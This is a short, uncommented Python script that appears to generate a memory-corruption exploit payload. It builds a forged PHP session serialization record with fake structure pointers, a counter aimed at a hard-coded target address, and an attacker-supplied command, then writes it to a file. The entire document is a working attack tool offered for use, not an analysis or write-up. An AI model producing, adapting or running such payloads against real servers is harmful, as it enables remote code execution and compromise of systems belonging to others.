#!/usr/bin/env python3
import struct,sys
TARGET=0x22c54c8
def build(K_dest,P,total,cmd,F=None,F_OFF=0x200,keylen=0x60):
    X=K_dest-total-0x1000
    val=X+24
    if F is None: F=K_dest+24+F_OFF
    key=bytearray(keylen)
    key[0x18:0x20]=struct.pack('<Q',F)
    key[0x2c:0x30]=struct.pack('<I',1)
    key[0x50:0x58]=struct.pack('<Q',F)
    key[0x58:0x5c]=struct.pack('<I',6)
    assert b'|' not in key, ('pipe key',hex(F),key.hex())
    first_var=bytes(key)+b'|i:%d;'%0xa3c074
    second_key_len=F_OFF-len(first_var)-len('|s:512:"')
    assert second_key_len>0,(second_key_len,F_OFF,len(first_var))
    second_key=b'B'*second_key_len
    raw2=bytearray(512)
    raw2[0x10:0x18]=struct.pack('<Q',len(cmd))
    raw2[0x18:0x18+len(cmd)]=cmd
    second_var=second_key+b'|s:512:"'+bytes(raw2)+b'";'
    assert len(first_var)+len(second_var)==F_OFF+512+2,(len(first_var),len(second_var))
    prefix=first_var+second_var
    L=total-len(prefix)-len(b'K|s:"')-2-1
    for _ in range(20):
        hdr=b'K|s:%d:"'%L; want=total-len(prefix)-len(hdr)-2
        if want==L: break
        L=want
    hdr=b'K|s:%d:"'%L
    raw3=bytearray([0x41])*L
    pbase=len(prefix)+len(hdr)
    file_off=P-val
    b=file_off-pbase
    assert 0<=b and b+0x98<=L,(hex(file_off),b,L,pbase)
    for off,q in ((0,P+56),(8,P+0x88),(16,P+0x88),(24,0),(32,0),(40,0),(48,0x7fffffff),(56,0),(64,0)):
        raw3[b+off:b+off+8]=struct.pack('<Q',q&0xffffffffffffffff)
    used=(TARGET-(P+0x88+0x10))//16
    raw3[b+0x88:b+0x90]=struct.pack('<q',used)
    raw3[b+0x90:b+0x98]=struct.pack('<Q',0)
    rec=prefix+hdr+bytes(raw3)+b'";'
    assert len(rec)==total,(len(rec),total)
    return rec,dict(K_dest=hex(K_dest),X=hex(X),val=hex(val),P=hex(P),F=hex(F),total=len(rec),L=L,used_target_static=used,used_target_static_hex=hex(used&0xffffffffffffffff))
if __name__=='__main__':
    K=int(sys.argv[1],0); P=int(sys.argv[2],0); total=int(sys.argv[3]); out=sys.argv[4]; cmd=sys.argv[5].encode(); F=int(sys.argv[6],0) if len(sys.argv)>6 else None
    rec,geo=build(K,P,total,cmd,F); open(out,'wb').write(rec); print(geo)
